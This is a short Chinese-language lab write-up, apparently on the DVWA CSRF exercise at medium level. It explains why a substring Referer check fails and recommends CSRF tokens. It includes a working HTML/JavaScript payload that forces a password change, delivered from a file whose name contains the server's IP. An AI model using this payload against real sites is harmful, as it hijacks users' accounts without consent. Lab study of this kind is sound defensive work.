## 源码 (`medium.php`)

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
    // 改密码
}
```

## 比 Low 多了什么

- 检查 `Referer` 请求头必须包含服务器名（`stripos` 不区分大小写）

## 漏洞在哪

只检查 Referer **里面有没有**服务器名字符串，不管来源。文件名或路径里带服务器名就能过。

## 攻击步骤

我这里是利用网站的方式

1. phpstudy 的 WWW 目录下新建 `192.html`，内容：

```html
<script>
location.href='http://192.168.1.167:8083/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change'
</script>
```

2. 浏览器访问 `http://192.168.1.167:8083/192.html`
3. 页面自动跳转 → Referer 为 `http://192.168.1.167:8083/192.html`，包含 `192.168.1.167`
4. `stripos` 命中 → 密码改为 `hacked`

> ⚠️ 不能从本地文件（`file://`）打开——浏览器不发 Referer。

## 为什么能绕过

| 防护 | 为什么没用 |
|------|-----------|
| `HTTP_REFERER` 检查 | 只判断字符串是否包含，不是严格同源校验。文件名/路径带服务器名即可 |

## 关键教训

**Referer 检查不等于 CSRF 防御。** 真正的防御是 CSRF token（不可预测、每次请求独立）。Referer 可被伪造、可被去除、可被文件名字符串绕过。
